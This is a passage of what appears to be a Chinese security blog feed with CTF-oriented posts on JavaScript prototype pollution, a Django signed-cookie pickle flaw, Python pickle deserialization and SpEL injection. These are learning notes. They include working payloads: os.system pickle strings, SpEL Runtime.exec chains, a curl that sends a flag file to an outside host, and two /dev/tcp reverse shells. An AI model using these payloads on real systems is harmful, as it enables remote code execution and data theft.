    <content type="text"><![CDATA[最近遇到好多原型污染的题目，又没有学过，做一个总结。 原文 : Node.js原型污染攻击的分析与利用 and 深入理解JavaScript Prototype污染攻击 JavaScript 中的对象 JavaScript 中的对象就是 key 和 value 的映射关系，就相当于 python 中的 dict ，比如有如下代码 : 12345678var s = &#123;name:"peri0d", age:"19"&#125;;s.name; // print "peri0d"s.age; // print "19"typeof(s); // print "object"console.log(s);// print Object &#123; name: "peri0d", age: "19" &#125;console.log(s.prototype);// print undefined 如果执行 console.log(s) 将会返回如下信息，可以看到很多属性和方法都包含在 prototype 中，这些多余的信息全部来自于 JavaScript 中的 Object 对象，这和 python 中 Object 是所有类的父类一个道理 JavaScript 中的所有对象都是通过 Object 对象建立的。它的构造函数为给定值创建一个对象包装器。如果给定值是 null 或 undefined，将会创建并返回一个空对象，否则，将返回一个与给定值对应类型的对象。当以非构造函数形式被调用时，Object 等同于 new Object() 。以如下代码为例来说明 12345678910111213141516test = Object.create(null);// print an empty object typeof(test);// print "object"console.log(test.prototype);// print undefinedconsole.log(test);// print the whole object and all its attributes// print Object &#123; &#125;test2 = Object.create(String);typeof(test2);// print "object"console.log(test2..prototype);// print String &#123; "" &#125;console.log(test2); JavaScript 中没有绝对的函数和类的概念，函数本身作为类的构造函数 在函数被创建的时候，它被添加了一个 prototype 属性，而普通的数据类型则没有。这个属性是一个对象(原型对象)且默认有一个 constructor 属性，该属性指向一个函数，在这个函数中，原型对象也是一个属性。 在对象被创建的时候，它被添加了一个 __proto__ 属性到新创建的对象中，这一属性指向构造函数的原型对象 object.__proto__ 指向 function.prototype 12345678910111213141516171819202122232425262728293031323334353637function person(fullName, age)&#123; this.age = age; this.fullName = fullName; this.details = function()&#123; return this.fullName+" has age: "+this.age; &#125;&#125;console.log(person.prototype);/*&#123;constructor: ƒ&#125; constructor: ƒ person(fullName, age) __proto__: Object*/var person1 = new person("Alice", 22);var person1 = new person("Bob", 20);console.log(person1);/*person &#123;age: 20, fullName: "Bob", details: ƒ&#125; age: 20 details: ƒ () fullName: "Bob" __proto__: constructor: ƒ person(fullName, age) arguments: null caller: null length: 2 name: "person" prototype: &#123;constructor: ƒ&#125; __proto__: ƒ () [[FunctionLocation]]: VM672:1 [[Scopes]]: Scopes[1] __proto__: Object*/person1.details();// print "Bob has age: 20" prototype 属性与 __proto__ 属性 原型 prototype 是类的一个属性，而所有类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法 12345678910function test()&#123; this.name = "peri0d";&#125;test.prototype.show = function show()&#123; console.log(this.name);&#125;test1 = new test();test1.show();// print "peri0d" 一个类实例化出的属性可以通过 __proto__ 来访问类的原型 12test1.__proto__ == test.prototype// print true constructor 属性 它返回创建实例对象的 Object 构造函数的引用，即返回用于创建这个对象的函数。注意，此属性的值是对函数本身的引用，而不是一个包含函数名称的字符串 举个例子 12345678910111213141516171819202122232425262728293031323334353637function Person() &#123; this.color = "yellow"; this.showColor = function () &#123; return this.color; &#125;&#125;console.log("Person.prototype.constructor: "+Person.prototype.constructor); /*Person.prototype.constructor: function Person() &#123; this.color = "yellow"; this.showColor = function () &#123; return this.color; &#125;&#125;*/var person1 = new Person(); console.log("person1.constructor: "+person1.constructor); /*person1.constructor: function Person() &#123; this.color = "yellow"; this.showColor = function () &#123; return this.color; &#125;&#125;*/// person1 实例通过 __proto__ 指向了 Person 的原型(Person.prototype)，所以可以访问到 constructorPerson.prototype = &#123;&#125;; // 修改 Person 的原型为 &#123;&#125;，这里也可以看处 prototype 可以在运行时修改var person2 = new Person(); console.log("person2.constructor: "+person2.constructor);/*person2.constructor: function Object() &#123; [native code] &#125;*/// person2 实例通过 __proto__ 指向了 Person 的原型(Person.prototype)，即这个空对象，所以它访问到 constructor 为 Object 上面说到，原型对象有一个 constructor ，它指向函数本身而且 constructor 的 constructor 是一个全局函数 constructor 1234567891011121314151617console.log(person2.constructor.constructor);/*Global Function constructorprint ƒ Function() &#123; [native code] &#125;*/person2.constructor.constructor("return 1");/*ƒ anonymous() &#123;return 1&#125;*/person2.constructor.constructor("return 1")();// call this Global Function// print 1 总结一下 定义一个 function 时，会加上 prototype 属性，表示它的原型对象，内含 constructor ，返回这个 function 的构造函数的引用，即函数本身。而这个 constructor 的 constructor 是一个全局函数 constructor 定义一个实例化对象时，会加上 __proto__ 属性，它等于 function.prototype ，这个对象的 constructor 就等于 object.__proto__.constructor ，但是这两个 constructor 代表的含义不同 JavaScript 中的原型 函数的 prototype 可以在运行时修改 123456789101112131415161718192021function person(fullName, age) &#123; this.age = age; this.fullName = fullName;&#125;console.log(person.prototype);// &#123;details: ƒ, constructor: ƒ&#125;var person1 = new person("Anirudh", 25); person.prototype.details = function() &#123; return this.fullName + " has age: " + this.age;&#125;person.prototype.key="peri0d";console.log(person.prototype);// print &#123;details: ƒ, key: "peri0d", constructor: ƒ&#125;console.log(person1.details()); // print "Anirudh has age: 25"console.log(person1.key); // print "peri0d" 在上面这段代码中我们通过添加一个新方法和属性的方式修改了函数的prototype，使用对象我们也可以达到同样的效果 123456789101112131415161718192021function person(fullName, age) &#123; this.age = age; this.fullName = fullName;&#125;var person1 = new person("Anirudh", 25);var person2 = new person("Anand", 45);person1.constructor.prototype.details = function() &#123; return this.fullName + " has age: " + this.age;&#125;// 上下两个相同person1.__proto__.constructor.prototype.details = function() &#123; return this.fullName + " has age: " + this.age;&#125;console.log(person1.details()); // print "Anirudh has age: 25" console.log(person2.details()); // print "Anand has age: 45" 个人认为，可以将函数看为类的构造函数，原型看为类 JavaScript 原型链继承 所有类对象在实例化的时候将会拥有 prototype 中的属性和方法，这个特性被用来实现 JavaScript 中的继承机制 1234567891011121314function Father() &#123; this.first_name = 'Donald' this.last_name = 'Trump'&#125;function Son() &#123; this.first_name = 'Melania'&#125;Son.prototype = new Father()let son = new Son()console.log(`Name: $&#123;son.first_name&#125; $&#123;son.last_name&#125;`)// print "Name: Melania Trump" 1.在对象 son 中寻找 last_name2.如果找不到，则在 son.__proto__中寻找 last_name3.如果仍然找不到，则继续在 son.__proto__.__proto__中寻找 last_name4.依次寻找，直到找到 null 结束。比如，Object.prototype 的 __proto__ 就是 null 这里为什么没有 Son.prototype = Father.prototype ，个人认为 Father.prototype 指向的是一个类对象，并没有对属性进行实例化，所以 Son 相当于没有继承 Father 每个构造函数( constructor )都有一个原型对象( prototype ) object.__proto__ 指向 function.prototype JavaScript 使用 prototype 链实现继承机制 原型链污染 举个例子 12345678910111213person = &#123;name : "Jack"&#125;;console.log(person.name);// print "Jack"person.__proto__.name = 'peri0d';console.log(person.name);// print "Jack"person2 = &#123;&#125;;console.log(person2.name);// print "peri0d" 在 person 这个实例化对象中寻找 name 属性，找到后输出。 将 Object 类的 name 属性赋值为 peri0d 然后实例化 person2 对象，在这个对象中没有找到 name 属性，进而到 __proto__ 中去寻找，找到后输出。这实际上是修改了 Object 类 在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象 可存在于对象合并和对象克隆中，找可以控制对象的属性的操作 例子 以 merge 函数为例 123456789function merge(target, source) &#123; for (let key in source) &#123; if (key in source &amp;&amp; key in target) &#123; merge(target[key], source[key]) &#125; else &#123; target[key] = source[key] &#125; &#125;&#125; 考虑如下代码，可以看到，merge 并没有修改 __proto__ 下 Object 的内容，而是将 b 作为其属性添加，这样再生成新对象的时候还是原来的 Object 1234567891011121314o1 = &#123;&#125;;o2 = &#123;a: 1, "__proto__": &#123;b: 2&#125;&#125;;merge(o1, o2);console.log(o1);// print &#123;a: 1, b: 2&#125;o3 = &#123;&#125;;console.log(o3.b);// print undefinedfor(let key in o2)&#123; console.log(key);&#125;// print a b ​ 将代码修改一下，这时 Object 已被污染 123456789o1 = &#123;&#125;;o2 = JSON.parse('&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;');merge(o1, o2);console.log(o1.a, o1.b);// print 1 2o3 = &#123;&#125;;console.log(o3.b);// print 2 ​ JSON 解析的情况下，__proto__ 会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历 o2 的时候会存在这个键。]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>原型污染</tag>
        <tag>原型链</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[code-breaking picklecode中对signed_cookies引擎分析]]></title>
    <url>%2F2019%2F09%2F12%2Fcode-breaking%20picklecode%E4%B8%AD%E5%AF%B9signed_cookies%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[原帖 : https://xz.aliyun.com/t/6265 最近做了 ph 牛的 code-breaking，在做 picklecode 这一题时，没有搞懂那个 django 的 signed_cookies 引擎对 session 的操作，就 debug 了一下，做个总结，算是做了个代码审计吧 0x01 获取 session_auth_hash 题目 : https://github.com/phith0n/code-breaking/tree/master/2018/picklecode django 使用的 SESSION_ENGINE 为 django.contrib.sessions.backends.signed_cookies pycharm 开启 debug 模式，username 为 peri0d，password 为 123456 入口文件在 views.py，第 34 行新建了用户并对密码进行了加密。第 35 行调用 auth_login() 函数，跳转到 auth\__init__.py 的 login() 方法 第 97 行，调用 user 类的 get_session_auth_hash() 方法来获取 session_auth_hash 的值，跟进 get_session_auth_hash() 给 key_salt 赋值后调用 salted_hmac(key_salt, self.password) 生成 session_auth_hash，这里的 password 是经过加密的，跟进 salted_hmac() 在第 39 行对 key_salt + secret 进行 sha1 加密并以 byte 类型返回给 key。这里的 value 是经过加密后的 password。然后调用 hmac.new()返回一个 sha1 模式的 hmac 对象 流程梳理 123456key_salt = '***'# SECRET_KEYsecret = '******'key = hashlib.sha1(key_salt + secret).digest()sha1_obj = hmac.new(key, msg=password_enc, digestmod=hashlib.sha1)session_auth_hash = sha1_obj.hexdigest() 0x02 初始化 sessionid 获取 session_auth_hash 后，单步调试，进入 base.py 执行 __contains__() 函数，参数为 _auth_user_id 单步调试，然后执行 _get_session() 函数，返回缓存 session，是一个空字典 在第 108 行执行 cycle_key()，使用新密钥保存相同的数据，调用 save()，它在请求结束时自动保存一个带有新密钥的 cookie 。 跟进 save()，在第 41 行执行 _get_session_key() ，生成一个 base64 编码后的字符串作为 session key，继续跟进，它又调用了 signing.dumps() 然后单步调试进入到 _get_session() 方法获取 self._session，从缓存中加载 session，此时为一个空字典，即 self._session == {} 然后分别给 compress，salt，serializer 赋值，然后调用 signing.dumps() ，继续跟进，传入的参数 obj = {}, salt = &#39;django.contrib.sessions.backends.signed_cookies&#39;, compress = True 在 signing.dumps() 中对序列化之后的数据进行压缩，然后进行 base64 编码，再 decode() 为一个 Unicode 的 base64d，其值为 &#39;gAN9cQAu&#39; ，最后调用 TimestampSigner 类的 sign() 方法，继续跟进 TimestampSigner 类继承自 Signer 类，先调用它的 __init__ 方法进行初始化，key = &#39;zs%o-mvuihtk6g4pgd+xpa&amp;1hh9%&amp;ulnf!@9qx8_y5kk+7^cvm&#39;, sep = &#39;:&#39;, salt = &#39;django.contrib.sessions.backends.signed_cookies&#39; 然后调用 TimestampSigner 类的 sign() 方法，根据 value=&#39;gAN9cQAu&#39;，sep 和 timestamp() 对 value 进行重新赋值，其值为 &#39;gAN9cQAu:1i5q6e&#39; ，然后再次在 Signer.sign() 中重新赋值，得到最后结果 &#39;gAN9cQAu:1i5q6e:wjJR2MUONx_wmPA3m8zYqTj5uCQ 回到 save() ，继续单步调试，调用了 base.py 中第 170 行的 _set_session_key() 方法，将 value 赋值给 session_key 和 _session_key 回到 save() ，完成赋值，回到 cycle_key()，再回到 auth\__init__.py 的 login() 方法的第 108 行，这时可以在变量列表看到设置的 session 信息了 后面的代码是 django 对用户的持久化处理以及对 CSRF token 的验证等等，值得注意的是在第 126 行到 128 行，进行了 session 设置 流程梳理 12345678910_session = &#123;&#125;# SECRET_KEYsecret = '******'salt='****'data = serializer().dumps(_session)compressed = zlib.compress(data)base64d = b64_encode(data).decode()session_key = TimestampSigner(SECRET_KEY, salt=salt).sign(base64d) 0x03 response 写入 session 然后看它如何在 response 中设置 cookie 的，继续调试，在 contrib\sessions\middleware.py 中发现其对 cookie 的操作，从 44 行开始是设置 cookie 的存活时间，在第 58 行看到了 save() 函数，进行 cookie 的保存，单步调试进入 在 save() 函数中，调用 _get_session_key() 函数，剩下的反序列化和前面的相同，只是 session 的值发生了改变，从空字典变为含有 3 个元素的字典，然后就是将 cookie 设置在返回包中，这就完成了 cookie 设置的分析 0x04 总结 总结一下，它对 session 处理的核心机制在于 django.core.signing.dumps() 函数，其具体代码如下，可以看到，data 为 pickle 序列化之后的 byte 对象，我们只要将 data 改为构造好的 evil pickle code 即能实现任意的代码执行 123456789101112131415def dumps(obj, key=None, salt='django.core.signing', serializer=JSONSerializer, compress=False): data = serializer().dumps(obj) is_compressed = False if compress: compressed = zlib.compress(data) if len(compressed) &lt; (len(data) - 1): data = compressed is_compressed = True base64d = b64_encode(data).decode() if is_compressed: base64d = '.' + base64d return TimestampSigner(key, salt=salt).sign(base64d)]]></content>
      <categories>
        <category>code-breaking</category>
      </categories>
      <tags>
        <tag>code-breaking</tag>
        <tag>代码审计</tag>
        <tag>Django signed_cookies</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python 序列化与反序列化]]></title>
    <url>%2F2019%2F09%2F10%2Fpython%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%2F</url>
    <content type="text"><![CDATA[关于 python 序列化与反序列化的一些基础知识，有待补充 python 序列化与反序列化 python 提供两个模块来实现反序列化，即 cPickle 和 pickle ，这两个模块功能是相同的，区别在于 cPickle 是 C 语言写的，pickle 是纯 Python 写的 写一个 Person 类并生成一个 admin 的实例化对象测试 1234567# python 3.7.3class Person(): def __init__(self, username, password): self.username = username self.password = passwordadmin = Person('admin','admin123') pickle.dumps() 方法将对象序列化为 byte 对象 12s = pickle.dumps(admin)# b'\x80\x03c__main__\nPerson\nq\x00)\x81q\x01&#125;q\x02(X\x08\x00\x00\x00usernameq\x03X\x05\x00\x00\x00adminq\x04X\x08\x00\x00\x00passwordq\x05X\x08\x00\x00\x00admin123q\x06ub.' pickle.loads() 将 byte 对象反序列化出对象，这个函数有个特性，就是对于未导入的库会尝试自动 import 12345678910uns = pickle.loads(s)# &lt;__main__.Person object at 0x00000229997E5780&gt;dir(uns)# ['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__slotnames__', '__str__', '__subclasshook__', '__weakref__', 'password', 'username']uns.username# 'admin'uns.password# 'admin123' 当一个类的实例对象被反序列化时，它的 __init__() 方法不会被调用，默认的方式是创建一个没有初始化的对象然后恢复它的属性。 RestrictedUnpickler 类优化反序列化 在 pickle 文档开头有如下一句话 Never unpickle data received from an untrustedor unauthenticated source. 考虑如下代码，这会导致系统命令 echo 的执行 12345import picklepickle.loads(b"cos\nsystem\n(S'echo peri0d'\ntR.")# peri0d# 0 文档给出的解决方案是在 Unpickler.find_class() 里面设置黑白名单检测，只能执行内置函数并且函数不在黑名单中，示例如下 123456789101112131415161718192021222324252627import builtinsimport ioimport pickleblack_builtins = &#123; 'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit',&#125;class ResRestrictedUnpickler(pickle.Unpickler): def find_class(self, moudle, name): if moudle == "builtins" and name not in black_builtins: # getattr 用于获取某个对象的属性值 return getattr(builtins, name) raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (moudle, name)) def restricted_loads(s): """Helper function analogous to pickle.loads().""" # BytesIO 用于在内存中读写数据，操作的对象是 byte 类型，对应了 pickle 序列化之后的类型 return ResRestrictedUnpickler(io.BytesIO(s)).load() 做个测试，print(restricted_loads(b&#39;\x80\x03]q\x00(K\x01K\x02K\x03K\x04X\x04\x00\x00\x000x10q\x01e.&#39;)) 第二个，print(restricted_loads(b&quot;cos\nsystem\n(S&#39;echo hello world&#39;\ntR.&quot;)) 第三个， print(restricted_loads((b&#39;cbuiltins\neval\n&#39;b&#39;(S\&#39;getattr(__import__(&quot;os&quot;), &quot;system&quot;)&#39;b&#39;(&quot;echo hello world&quot;)\&#39;\ntR.&#39;))) python 反序列化漏洞 所谓反序列化漏洞，就是在序列化的过程中，类的一些魔术方法一起被序列化，而在反序列化时，这些函数就会执行，通过构造相应的 POP 链实现不同的攻击 示例如下，关键点在于 __reduce__() 方法，当对象被序列化时就会被调用，它返回一个代表全局名称的字符串或者一个元组 123456789101112131415import pickleimport osclass Person(): def __init__(self, username, password): self.username = username self.password = password def __reduce__(self): return (os.system,('whoami',))admin = Person('admin','admin123')s = b'\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.'uns = pickle.loads(s) 返回字符串 : 查找字符串对应名字的对象，将其序列化之后返回 返回元组 : 元组中第一个参数为可调用的对象，第二个元素是该对象所需要的参数元组 python3.7 内置函数]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>反序列化</tag>
        <tag>pickle</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpEL 注入]]></title>
    <url>%2F2019%2F09%2F10%2FSpEL%20%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[做题目遇到了，就去查了一些这方面的资料，总结一下。 SpEL 简介 全称为 Spring Expression Language，即 Spring 表达式语言，和 JSP 类似但是强于 JSP 官方文档 : https://docs.spring.io/spring/docs/3.0.x/reference/expressions.html 语法 : #{...} 大括号内的字符都是 SpEL 表达式，用于引入变量，属性，方法等 ${...} 大括号内的是属性名 T(Type) 用此表示类实例，返回一个类对象，常用于引入静态常量或者静态方法 用法 : 注解在 @value 中 12345678910111213141516public static class FieldValueTestBean @Value("#&#123; systemProperties['user.region'] &#125;") private String defaultLocale;// systemProperties['user.region'] 是预先定义好的，赋值给 defaultLocale public void setDefaultLocale(String defaultLocale) &#123; this.defaultLocale = defaultLocale; &#125; public String getDefaultLocale() &#123; return this.defaultLocale; &#125;&#125; bean 依赖 123456&lt;bean id="numberGuess" class="org.spring.samples.NumberGuess"&gt; &lt;!-- 相当于将一个随机数乘 100.0 赋值给 randomNumber --&gt; &lt;property name="randomNumber" value="#&#123; T(java.lang.Math).random() * 100.0 &#125;"/&gt; &lt;!-- other properties --&gt;&lt;/bean&gt; 在代码块中使用 Expression，ExpressionParser 将字符串表达式转换为 Expression 对象，因此，parseExpression 的值将在 EvaluationContext 中可用。此EvaluationContext 将是唯一可以从中访问字符串 EL 中的所有属性和变量的对象。 123456// 解析器，解析表达式ExpressionParser parser = new SpelExpressionParser();// 计算先前定义好的表达式Expression exp = parser.parseExpression("'Hello World'.concat('!')");// 获取结果 'Hello World!'String message = (String) exp.getValue(); 变量 : #bean_id 获取容器内变量 #this 使用当前正在计算的上下文 #root 引用容器的 root 对象 SpEL 表达式 文本表达式 : 支持字符串，日期，数字，布尔和 null 12345678910111213ExpressionParser parser = new SpelExpressionParser();// evals to "Hello World"String helloWorld = (String) parser.parseExpression("'Hello World'").getValue(); double avogadrosNumber = (Double) parser.parseExpression("6.0221415E+23").getValue(); // evals to 2147483647int maxValue = (Integer) parser.parseExpression("0x7FFFFFFF").getValue(); boolean trueValue = (Boolean) parser.parseExpression("true").getValue();Object nullValue = parser.parseExpression("null").getValue(); 属性值( Properties )使用 . 来访问，数组( Arrays )和列表( Lists )使用 [] 来获取元素，字典( maps )使用 [] 和 key 访问 value 12345678910111213141516171819// evals to 1856int year = (Integer) parser.parseExpression("Birthdate.Year + 1900").getValue(context); // Inventions ArrayStandardEvaluationContext teslaContext = new StandardEvaluationContext(tesla);// evaluates to "Induction motor"String invention = parser.parseExpression("inventions[3]").getValue(teslaContext, String.class); // Members ListStandardEvaluationContext societyContext = new StandardEvaluationContext(ieee);// evaluates to "Nikola Tesla"String name = parser.parseExpression("Members[0].Name").getValue(societyContext, String.class);// Officer's DictionaryInventor pupin = parser.parseExpression("Officers['president']").getValue(societyContext, Inventor.class);// evaluates to "Idvor"String city = parser.parseExpression("Officers['president'].PlaceOfBirth.City").getValue(societyContext, String.class);// setting valuesparser.parseExpression("Officers['advisors'][0].PlaceOfBirth.Country").setValue(societyContext, "Croatia"); 列表( Lists )可以在表达式中直接使用 {} 表达 1234// evaluates to a Java list containing the four numbersList numbers = (List) parser.parseExpression("&#123;1,2,3,4&#125;").getValue(context); List listOfLists = (List) parser.parseExpression("&#123;&#123;'a','b'&#125;,&#123;'x','y'&#125;&#125;").getValue(context); 数组可以在表达式中直接使用 Java 语法构建，但是多维数组不能手动初始化 1234567int[] numbers1 = (int[]) parser.parseExpression("new int[4]").getValue(context); // Array with initializerint[] numbers2 = (int[]) parser.parseExpression("new int[]&#123;1,2,3&#125;").getValue(context); // Multi dimensional arrayint[][] numbers3 = (int[][]) parser.parseExpression("new int[4][5]").getValue(context); Java 函数可以直接在表达式中使用 12345// string literal, evaluates to "bc"String c = parser.parseExpression("'abc'.substring(2, 3)").getValue(String.class);// evaluates to trueboolean isMember = parser.parseExpression("isMember('MihajloPupin')").getValue(societyContext, Boolean.class); 可以使用关系运算，逻辑运算和数学运算 123&lt;, &gt;, &lt;=, &gt;=, ==, !=, /, %, !AND, OR, NOT+, -, *, /, %, ^ 赋值可以通过赋值运算符来完成，也可以在 setValue 函数中完成，也可以在 getValue 的调用中完成 1234567Inventor inventor = new Inventor(); StandardEvaluationContext inventorContext = new StandardEvaluationContext(inventor);parser.parseExpression("Name").setValue(inventorContext, "Alexander Seovic2");// alternatively( 或者 )String aleks = parser.parseExpression("Name = 'AlexandarSeovic'").getValue(inventorContext, String.class); T(Type) 可以指定 java.lang.class 的实例，但是对于其他实例，要完全限定 12345Class dateClass = parser.parseExpression("T(java.util.Date)").getValue(Class.class);Class stringClass = parser.parseExpression("T(String)").getValue(Class.class);boolean trueValue = parser.parseExpression("T(java.math.RoundingMode).CEILING &lt; T(java.math.RoundingMode).FLOOR").getValue(Boolean.class); 可以使用 new 调用构造函数，但是除了基元类型和字符串（其中可以使用int、float等）之外，所有的类都应该使用完全限定的类名 1234Inventor einstein = p.parseExpression("new org.spring.samples.spel.inventor.Inventor('Albert Einstein', 'German')").getValue(Inventor.class);//create new inventor instance within add method of Listp.parseExpression("Members.add(new org.spring.samples.spel.inventor.Inventor('Albert Einstein', 'German'))").getValue(societyContext); 变量可以使用 #变量名 来进行引用，这些变量是在 StandardEvaluationContext 中使用 setVariable 赋值的 1234567Inventor tesla = new Inventor("Nikola Tesla", "Serbian");StandardEvaluationContext context = new StandardEvaluationContext(tesla);context.setVariable("newName", "Mike Tesla");// 首字母不区分大小写parser.parseExpression("Name = #newName").getValue(context);System.out.println(tesla.getName()) // "Mike Tesla" 使用 #root 引用根对象，使用 #this 引用当前上下文对象。 123456789101112// create an array of integersList&lt;Integer&gt; primes = new ArrayList&lt;Integer&gt;();primes.addAll(Arrays.asList(2,3,5,7,11,13,17));// create parser and set variable 'primes' as the array of integersExpressionParser parser = new SpelExpressionParser();StandardEvaluationContext context = new StandardEvaluationContext();context.setVariable("primes",primes);// all prime numbers &gt; 10 from the list (using selection ?&#123;...&#125;)// evaluates to [11, 13, 17]List&lt;Integer&gt; primesGreaterThanTen = (List&lt;Integer&gt;) parser.parseExpression("#primes.?[#this&gt;10]").getValue(context); 通过使用 StandardEvaluationContext 中的 registerFunction(String name, Method m) 函数来自定义函数 123456789101112131415public abstract class StringUtils &#123; public static String reverseString(String input) &#123; StringBuilder backwards = new StringBuilder(); for (int i = 0; i &lt; input.length(); i++) backwards.append(input.charAt(input.length() - 1 - i)); &#125; return backwards.toString(); &#125;&#125;ExpressionParser parser = new SpelExpressionParser();StandardEvaluationContext context = new StandardEvaluationContext();context.registerFunction("reverseString", StringUtils.class.getDeclaredMethod("reverseString", new Class[] &#123; String.class &#125;));String helloWorldReversed = parser.parseExpression("#reverseString('hello')").getValue(context, String.class); 如果已使用 Bean 解析器配置了上下文，可以使用 @ 获取 Bean 123456ExpressionParser parser = new SpelExpressionParser();StandardEvaluationContext context = new StandardEvaluationContext();context.setBeanResolver(new MyBeanResolver());// This will end up calling resolve(context,"foo") on MyBeanResolver during evaluationObject bean = parser.parseExpression("@foo").getValue(context); 表达式允许多个文本和解析块混合使用，常以 #{} 作为分界符 12String randomPhrase = parser.parseExpression("random number is #&#123;T(java.lang.Math).random()&#125;", new TemplateParserContext()).getValue(String.class);// evaluates to "random number is 0.7038186818312008" SpEL 中的 RCE SpEL 有两种 EvaluationContext，StandardEcalutionContext 和 SimpleEvaluationContext 两种 EvaluationContext 的区别 : 12345678910111213String calc = "T(java.lang.Runtime).getRuntime().exec('calc.exe')";ExpressionParser parser = new SpelExpressionParser();StandardEvaluationContext std_danger = new StandardEvaluationContext();EvaluationContext simple_safe = SimpleEvaluationContext.forReadOnlyDataBinding ().build();Expression exp = parser.parseExpression(calc);// 执行命令Object value_1 = exp.getValue(std_danger);//报错Object value_2 = exp.getValue(simple_safe); 在不指定 EvaluationContext 时，默认采用的是 StandardEvaluationContext，例如 Spring Data Commons 远程代码执行漏洞_CVE-2018-1273( 1.13-1.13.10, 2.0-2.0.5 )，SpringBoot SpEL表达式注入漏洞( 1.1.0-1.1.12, 1.2.0-1.2.7, 1.3.0 )， payload : 12345678910111213// http://rui0.cn/archives/1043$&#123;12*12&#125;T(java.lang.Runtime).getRuntime().exec("nslookup a.com")T(Thread).sleep(10000)#this.getClass().forName('java.lang.Runtime').getRuntime().exec('nslookup a.com')new java.lang.ProcessBuilder(&#123;'nslookup a.com'&#125;).start()// 利用反射构造#&#123;T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]&#123;"/bin/bash","-c","curl fg5hme.ceye.io/`cat flag_j4v4_chun|base64|tr '\n' '-'`"&#125;)&#125;// 利用 ScriptEngineManager 构造#&#123;T(javax.script.ScriptEngineManager).newInstance().getEngineByName("nashorn").eval("s=[3];s[0]='/bin/bash';s[1]='-c';s[2]='ex"+"ec 5&lt;&gt;/dev/tcp/1.2.3.4/2333;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done';java.la"+"ng.Run"+"time.getRu"+"ntime().ex"+"ec(s);")&#125; 反射构造 RCE 的分析 关于反射 : Java 反射机制 根据源码，不难看出，getRuntime 是返回一个 Runtime 的实例化对象，Runtime.getRuntime 就是实例化一个 Runtime 对象，接着调用 Runtime 类的 exec 函数 在 windows 上利用 Runtime 打开计算器的代码如下 : 1Runtime.getRuntime().exec(new String[]&#123;"cmd","/c","C:\\Windows\\System32\\calc.exe"&#125;); 利用反射打开计算器的代码如下 : 1"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime"), new String[]&#123;"cmd","/c","C:\\Windows\\System32\\calc.exe"&#125;); &quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;) 获取 String 类并转换为 Runtime 类 getMethod(&quot;exec&quot;,&quot;&quot;.getClass()) 获取 Runtime 类的 exec 函数，并说明 exec 函数的参数类型为 String invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;), new String[]{&quot;cmd&quot;,&quot;/c&quot;,&quot;C:\\Windows\\System32\\calc.exe&quot;}) 执行 exec 函数，第一个参数为含有 exec 函数的对象，第二个参数为 exec 函数的参数 这样虽然能够打开计算器，但是会报错，&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;) 返回的是类，而不是对象，所以要再使用 getRuntime 来实例化一个对象，最终 payload 如下 1"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke(("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke("".getClass().forName("java.lang.Runtime"),null)), new String[]&#123;"cmd","/c","C:\\Windows\\System32\\calc.exe"&#125;); 那么 RCE 就可以写成反弹 shell 的形式 : 1"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke(("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke("".getClass().forName("java.lang.Runtime"),null)), new String[]&#123;"/bin/bash","-c","bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"&#125;);]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>java</tag>
        <tag>SpEL</tag>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 反弹 shell]]></title>
    <url>%2F2019%2F09%2F10%2F%E5%8F%8D%E5%BC%B9%20shell%2F</url>
